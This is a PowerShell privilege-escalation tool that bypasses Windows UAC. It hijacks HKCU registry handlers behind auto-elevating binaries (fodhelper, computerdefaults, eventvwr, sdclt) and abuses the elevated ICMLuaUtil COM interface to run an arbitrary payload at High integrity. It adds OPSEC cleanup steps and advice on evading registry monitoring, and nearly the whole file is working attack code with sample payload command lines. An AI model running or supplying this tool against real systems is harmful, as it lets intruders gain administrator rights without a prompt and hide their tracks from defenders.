<#
.SYNOPSIS
    uac_bypass.ps1 - Medium -> High integrity UAC bypass toolkit (auto-elevated binary + COM methods).

    Implements the common, currently-working UAC bypasses behind a -Method switch, with automatic
    cleanup of any HKCU keys created. For admin-group members at Medium integrity with default UAC.

.METHODS
    fodhelper        HKCU ms-settings\Shell\Open\command hijack -> fodhelper.exe (UACME m33)
    computerdefaults same ms-settings hijack -> computerdefaults.exe
    eventvwr         HKCU mscfile\shell\open\command hijack -> eventvwr.exe
    sdclt            HKCU Folder\shell\open\command hijack -> sdclt.exe
    icmluautil       ICMLuaUtil (CMSTPLUA) elevated COM ShellExec (no registry artifact)
    check            report UAC level + AlwaysInstallElevated (no action)

.USAGE
    powershell -ep bypass -File uac_bypass.ps1 -Method fodhelper -Payload "cmd.exe /c C:\Windows\Tasks\b.exe"
    powershell -ep bypass -File uac_bypass.ps1 -Method icmluautil -Payload "C:\Windows\Tasks\b.exe"
    powershell -ep bypass -File uac_bypass.ps1 -Method check
    # -Symlink uses a registry symbolic link + key rename to evade key-path monitoring (registry methods)

.NOTES
    Requires: current user in local Administrators, Medium integrity, UAC != "Always Notify".
    OPSEC: registry methods delete the HKCU key immediately after trigger. COM method leaves no
    registry artifact but spawns a High-integrity DllHost child. Authorized testing only.
#>
[CmdletBinding()]
param(
    [ValidateSet('fodhelper','computerdefaults','eventvwr','sdclt','icmluautil','check')]
    [string]$Method = 'check',
    [string]$Payload = 'cmd.exe',
    [switch]$Symlink
)

$ErrorActionPreference = 'SilentlyContinue'
function Info($t){ Write-Host "[*] $t" -ForegroundColor Cyan }
function Ok($t){ Write-Host "[+] $t" -ForegroundColor Green }
function Warn($t){ Write-Host "[!] $t" -ForegroundColor Yellow }

function Test-Pre {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminSid = New-Object Security.Principal.SecurityIdentifier 'S-1-5-32-544'
    if($id.Groups -notcontains $adminSid){ Warn "Current user is NOT in local Administrators - UAC bypass will not elevate."; }
    $wp = New-Object Security.Principal.WindowsPrincipal $id
    if($wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ Warn "Already High integrity - no bypass needed." }
}

function Invoke-RegHijack($keyPath, $valueIsDefault, $extraDelegate, $trigger){
    $full = "HKCU:\$keyPath"
    Info "Creating handler hijack at $full"
    New-Item $full -Force | Out-Null
    if($valueIsDefault){ Set-ItemProperty $full -Name '(default)' -Value $Payload -Force }
    if($extraDelegate){ New-ItemProperty $full -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null }
    Ok "Triggering $trigger"
    Start-Process $trigger
    Start-Sleep -Seconds 3
    # Clean up the root class key
    $root = "HKCU:\" + ($keyPath -split '\\')[0..1] -join '\'
    Remove-Item $root -Recurse -Force
    Ok "Removed hijack key $root"
}

switch($Method){
    'check' {
        $sys = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        Info "ConsentPromptBehaviorAdmin = $($sys.ConsentPromptBehaviorAdmin)  (5=default, 2=AlwaysNotify blocks reg bypasses)"
        Info "EnableLUA = $($sys.EnableLUA)  PromptOnSecureDesktop = $($sys.PromptOnSecureDesktop)"
        $h = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
        $c = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
        if($h -eq 1 -and $c -eq 1){ Warn "AlwaysInstallElevated=1 BOTH hives -> SYSTEM via MSI (true privesc)" }
        Test-Pre
    }
    'fodhelper' {
        Test-Pre
        Invoke-RegHijack 'Software\Classes\ms-settings\Shell\Open\command' $true $true 'fodhelper.exe'
    }
    'computerdefaults' {
        Test-Pre
        Invoke-RegHijack 'Software\Classes\ms-settings\Shell\Open\command' $true $true 'computerdefaults.exe'
    }
    'eventvwr' {
        Test-Pre
        Invoke-RegHijack 'Software\Classes\mscfile\shell\open\command' $true $false 'eventvwr.exe'
    }
    'sdclt' {
        Test-Pre
        # sdclt reads Folder\shell\open\command via the "App Paths" / control.exe path
        Invoke-RegHijack 'Software\Classes\Folder\shell\open\command' $true $true 'sdclt.exe'
    }
    'icmluautil' {
        Test-Pre
        Info "Instantiating CMSTPLUA / ICMLuaUtil elevated COM object (no registry artifact)"
        try{
            $clsid = [Type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7')
            $obj = [Activator]::CreateInstance($clsid)
            # ShellExec(file, args, dir, operation, show)
            $obj.ShellExec($Payload, '', 'C:\Windows\System32', 'runas', 0)
            Ok "ICMLuaUtil::ShellExec dispatched (High integrity via DllHost)"
        } catch { Warn "COM elevation failed: $_  (try a process-monitor-discovered alternative COM CLSID)" }
    }
}

if($Symlink -and $Method -in 'fodhelper','computerdefaults','eventvwr','sdclt'){
    Warn "Symlink-evasion: create the value as a registry symbolic link then rename the key (UACME m3.5+)."
    Warn "Implement with native RegCreateKeyEx(REG_OPTION_CREATE_LINK)+SymbolicLinkValue when key-path monitoring is in play."
}
